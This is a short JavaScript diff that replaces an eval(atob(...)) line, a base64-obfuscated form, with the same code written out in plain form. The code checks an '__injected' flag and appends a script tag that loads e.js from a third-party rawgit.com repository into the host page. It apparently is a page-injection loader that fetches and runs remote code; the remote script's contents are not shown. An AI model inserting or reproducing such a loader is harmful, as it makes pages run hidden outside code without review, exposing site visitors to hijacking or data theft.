@@ -1,2 +1,8 @@
 
-eval(atob("aWYodHlwZW9mIF9faW5qZWN0ZWQgPT0gInVuZGVmaW5lZCIpIHsNCnZhciBzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7DQpzLnNyYyA9ICJodHRwczovL3Jhd2dpdC5jb20vYWZyZWVyZXBvL3JlcG8xL21hc3Rlci9lLmpzIjsNCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7IF9faW5qZWN0ZWQgPSAxOyB9"));
+if(typeof __injected == "undefined")
+{
+    var s = document.createElement("script");
+    s.src = "https://rawgit.com/afreerepo/repo1/693e641b5f51387db26c6a719ab4a94afcc42a16/e.js";
+    document.body.appendChild(s);
+    __injected = 1;
+}
